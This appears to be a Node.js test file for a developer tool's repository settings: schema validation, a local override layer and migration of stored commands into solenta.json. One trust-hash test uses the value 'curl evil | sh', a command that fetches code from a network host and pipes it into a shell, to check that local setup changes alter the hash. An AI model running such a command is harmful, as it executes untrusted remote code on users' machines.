"use strict";

/**
 * #438: settings as code. Strict keys + schema, the solenta.local.json
 * layer (merge by id, hide), and the move-to-solenta.json migration.
 */

const { describe, it } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { execFileSync } = require("node:child_process");
const { Store } = require("../store.js");
const services = require("../services.js");
const { waitForCommand } = require("../projectCommands.js");
const { parseRepoConfig, readRepoConfig, REPO_KEYS, SCHEMA_URL } = require("../repoConfig.js");
const { parseAutomations } = require("../automations-file.js");
const { moveConfigToRepo } = require("../configMigrate.js");

const schema = JSON.parse(
  fs.readFileSync(path.join(__dirname, "..", "..", "site", "solenta.schema.json"), "utf8"),
);

function git(cwd, args) {
  return execFileSync("git", args, { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
}

describe("strict keys and schema", () => {
  it("rejects typos at every level the app parses", () => {
    assert.match(parseRepoConfig({ setpu: "npm ci" }).error, /unknown key "setpu"/);
    assert.match(
      parseRepoConfig({ quickActions: [{ name: "T", comand: "x" }] }).error,
      /quickActions\[0\]: unknown key "comand"/,
    );
    assert.match(parseRepoConfig({ devServer: { redy: {} } }).error, /devServer\.redy/);
    assert.match(
      parseAutomations({
        automations: [{ id: "a", name: "A", prompt: "p", provider: "claude", preset: "hourly", enabld: true }],
      }).error,
      /unknown key "enabld"/,
    );
  });

  it("accepts $schema and the non-command keys", () => {
    const cfg = parseRepoConfig({
      $schema: SCHEMA_URL,
      setup: "npm ci",
      iconPath: "logo.svg",
      automations: [],
      devServer: { ready: { tcp: 3000 } },
    });
    assert.equal(cfg.setup, "npm ci");
  });

  it("the published schema lists exactly the keys the parser allows", () => {
    assert.equal(schema.$id, SCHEMA_URL);
    assert.deepEqual(Object.keys(schema.properties).sort(), [...REPO_KEYS].sort());
    assert.deepEqual(
      Object.keys(schema.properties.quickActions.items.properties).sort(),
      ["command", "hidden", "id", "name", "stopOnSettle"],
    );
  });
});

describe("solenta.local.json layer", () => {
  const shared = {
    setup: "npm ci",
    quickActions: [
      { id: "test", name: "Test", command: "npm test" },
      { name: "Lint", command: "npm run lint" },
    ],
  };

  it("merges quick actions by id or name, and hides shared entries", () => {
    const cfg = parseRepoConfig(shared, {
      setup: "pnpm i",
      quickActions: [
        { id: "test", hidden: true },
        { name: "Lint", command: "eslint ." },
        { name: "Mine", command: "make mine" },
      ],
    });
    assert.equal(cfg.setup, "pnpm i");
    assert.equal(cfg.setupSource, "solenta.local.json");
    assert.deepEqual(cfg.quickActions, [
      { id: "repo:0", name: "Lint", command: "eslint .", source: "solenta.local.json" },
      { id: "repo:1", name: "Mine", command: "make mine", source: "solenta.local.json" },
    ]);
  });

  it("an id-less local row overrides or hides a shared row by name, keeping its id", () => {
    const over = parseRepoConfig(shared, { quickActions: [{ name: "Test", command: "vitest" }] });
    assert.deepEqual(over.quickActions[0], {
      id: "repo:test", name: "Test", command: "vitest", source: "solenta.local.json",
    });
    const hid = parseRepoConfig(shared, { quickActions: [{ name: "Test", hidden: true }] });
    assert.deepEqual(hid.quickActions.map((a) => a.name), ["Lint"]);
  });

  it("a hidden row with an id never falls back to hiding by name", () => {
    const cfg = parseRepoConfig(shared, { quickActions: [{ id: "removed", name: "Test", hidden: true }] });
    assert.deepEqual(cfg.quickActions.map((a) => a.name), ["Test", "Lint"]);
  });

  it("explicit ids give stable button ids", () => {
    const cfg = parseRepoConfig(shared);
    assert.deepEqual(cfg.quickActions.map((a) => a.id), ["repo:test", "repo:1"]);
  });

  it("onSettle can name a hidden action", () => {
    const cfg = parseRepoConfig({ ...shared, onSettle: "Test" }, { quickActions: [{ id: "test", hidden: true }] });
    assert.equal(cfg.onSettle, "npm test");
  });

  it("the trust hash covers the local layer; shared-only hash is unchanged", () => {
    const base = parseRepoConfig(shared).hash;
    assert.equal(parseRepoConfig(shared, {}).hash, base);
    assert.notEqual(parseRepoConfig(shared, { setup: "curl evil | sh" }).hash, base);
  });

  it("local may only override commands, and hidden is local-only", () => {
    assert.match(parseRepoConfig({}, { automations: [] }).error, /solenta\.local\.json: unknown key "automations"/);
    assert.match(
      parseRepoConfig({ quickActions: [{ id: "x", hidden: true }] }).error,
      /unknown key "hidden"/,
    );
    assert.match(
      parseRepoConfig(shared, {
        quickActions: Array.from({ length: 7 }, (_, i) => ({ name: `n${i}`, command: "x" })),
      }).error,
      /at most 8 quickActions after merging/,
    );
  });

  it("readRepoConfig reads the local file beside solenta.json, or alone", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "coder-layers-"));
    try {
      fs.writeFileSync(path.join(dir, "solenta.local.json"), JSON.stringify({ setup: "make local" }));
      assert.equal(readRepoConfig(dir).setup, "make local");
      fs.writeFileSync(path.join(dir, "solenta.json"), JSON.stringify({ setup: "make shared", quickActions: [{ name: "A", command: "a" }] }));
      const cfg = readRepoConfig(dir);
      assert.equal(cfg.setup, "make local");
      assert.equal(cfg.quickActions[0].name, "A");
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("move stored commands to solenta.json", () => {
  it("commits solenta.json + .gitignore on a fresh branch from origin", async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "coder-migrate-"));
    let threadId = null;
    try {
      const origin = path.join(tmp, "origin.git");
      const repo = path.join(tmp, "repo");
      git(tmp, ["init", "--bare", "-b", "main", origin]);
      git(tmp, ["clone", origin, repo]);
      git(repo, ["config", "user.email", "t@example.com"]);
      git(repo, ["config", "user.name", "T"]);
      fs.writeFileSync(path.join(repo, "solenta.json"), JSON.stringify({ iconPath: "logo.svg", setup: "old" }));
      fs.writeFileSync(path.join(repo, ".gitignore"), "node_modules");
      git(repo, ["add", "."]);
      git(repo, ["commit", "-m", "init"]);
      git(repo, ["push", "origin", "main"]);
      // The checkout sits on an unrelated branch: the PR must not carry it.
      git(repo, ["checkout", "-b", "wip"]);
      fs.writeFileSync(path.join(repo, "wip.txt"), "wip");
      git(repo, ["add", "."]);
      git(repo, ["commit", "-m", "wip"]);

      const store = new Store(path.join(tmp, "store.json"));
      const project = await services.addProject(store, repo);
      services.updateProject(store, project.id, {
        setupCommand: "echo setup",
        quickActions: [{ name: "Test", command: "npm test" }],
      });

      // A local bare origin is no forge, so createPr stops after the commit.
      await assert.rejects(
        moveConfigToRepo(store, { projectId: project.id }, { worktreeBase: path.join(tmp, "wt") }),
        /PR creation requires/,
      );
      const thread = services.listThreads(store).find((t) => t.projectId === project.id);
      threadId = thread.id;
      const branch = store.getThread(thread.id).branch;
      assert.equal(git(repo, ["log", "--format=%s", `main..${branch}`]), "Move project commands to solenta.json");
      const doc = JSON.parse(git(repo, ["show", `${branch}:solenta.json`]));
      assert.deepEqual(doc, {
        $schema: SCHEMA_URL,
        iconPath: "logo.svg",
        setup: "echo setup",
        quickActions: [{ id: "test", name: "Test", command: "npm test" }],
      });
      assert.equal(git(repo, ["show", `${branch}:.gitignore`]), "node_modules\nsolenta.local.json");
      // Stored settings stay until the user clears them after merge.
      assert.equal(store.getProject(project.id).setupCommand, "echo setup");
    } finally {
      if (threadId) await waitForCommand(threadId);
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });

  it("keeps an onSettle that named a replaced file action", () => {
    const { migratedDoc } = require("../configMigrate.js");
    const existing = { onSettle: "Cleanup", quickActions: [{ name: "Cleanup", command: "make clean" }] };
    const doc = migratedDoc(existing, { setup: null, actions: [{ name: "Test", command: "npm test" }] });
    assert.equal(doc.onSettle, "make clean");
    const same = migratedDoc(existing, { setup: null, actions: [{ name: "Cleanup", command: "make clean" }] });
    assert.equal(same.onSettle, "Cleanup");
  });

  it("refuses a project with nothing stored", async () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "coder-migrate-"));
    try {
      const repo = path.join(tmp, "repo");
      fs.mkdirSync(repo);
      git(repo, ["init", "-b", "main"]);
      const store = new Store(path.join(tmp, "store.json"));
      const project = await services.addProject(store, repo);
      await assert.rejects(
        moveConfigToRepo(store, { projectId: project.id }, { worktreeBase: tmp }),
        /no stored setup command or quick actions/,
      );
    } finally {
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });
});
